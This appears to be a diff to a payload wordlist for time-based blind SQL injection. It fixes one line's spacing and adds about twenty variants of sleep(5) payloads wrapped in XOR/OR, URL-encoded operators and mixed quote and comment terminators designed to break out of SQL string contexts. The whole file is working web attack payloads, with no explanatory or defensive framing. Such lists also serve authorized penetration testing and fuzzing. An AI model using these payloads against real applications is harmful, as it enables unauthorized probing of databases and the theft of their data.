@@ -3,7 +3,7 @@
 if(now()=sysdate(),sleep(5),0)
 'XOR(if(now()=sysdate(),sleep(5),0))XOR'
 'XOR(if(now()=sysdate(),sleep(5*1),0))OR'
-if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR" /
+if(now()=sysdate(),sleep(5),0)/"XOR(if(now()=sysdate(),sleep(5),0))OR"/
 if(now()=sysdate(),sleep(5),0)/*'XOR(if(now()=sysdate(),sleep(5),0))OR'"XOR(if(now()=sysdate(),sleep(5),0))OR"*/
 if(now()=sysdate(),sleep(5),0)/'XOR(if(now()=sysdate(),sleep(5), 0))OR'"XOR(if(now()=sysdate(),sleep(5),0) and 5=5)"/
 SLEEP(5)/*'or SLEEP(5) or '" or SLEEP(5) or "*/
@@ -30,3 +30,23 @@ desc%2c(select*from(select(sleep(5)))а)
 (select(0)from(select(sleep(5)))V)+'"+ 
 (select(0)from(select(sleep(5)))v)+"*/
 ', ''),/*test*/%26%26%09sLeEp(5)%09
+"XOR(if(now()=sysdate(),sleep(5),0))XOR"
+"XOR(if(now()=sysdate(),sleep(5*1),0))OR"
+"%2b(select*from(select(sleep(5)))a)%2b"
+"+(select*from(select(sleep(5)))a)+"
+", ''),/*test*/%26%26%09sLeEp(5)%09
+'"XOR(if(now()=sysdate(),sleep(5),0))XOR"
+'"XOR(if(now()=sysdate(),sleep(5*1),0))OR"
+'"%2b(select*from(select(sleep(5)))a)%2b"
+'"+(select*from(select(sleep(5)))a)+"
+'", ''),/*test*/%26%26%09sLeEp(5)%09
+'"XOR(if(now()=sysdate(),sleep(5),0))XOR"/*
+'"XOR(if(now()=sysdate(),sleep(5*1),0))OR"/*
+'"%2b(select*from(select(sleep(5)))a)%2b"/*
+'"+(select*from(select(sleep(5)))a)+"/*
+'", ''),/*test*/%26%26%09sLeEp(5)%09/*
+'"XOR(if(now()=sysdate(),sleep(5),0))XOR"*/
+'"XOR(if(now()=sysdate(),sleep(5*1),0))OR"*/
+'"%2b(select*from(select(sleep(5)))a)%2b"*/
+'"+(select*from(select(sleep(5)))a)+"*/
+'", ''),/*test*/%26%26%09sLeEp(5)%09*/
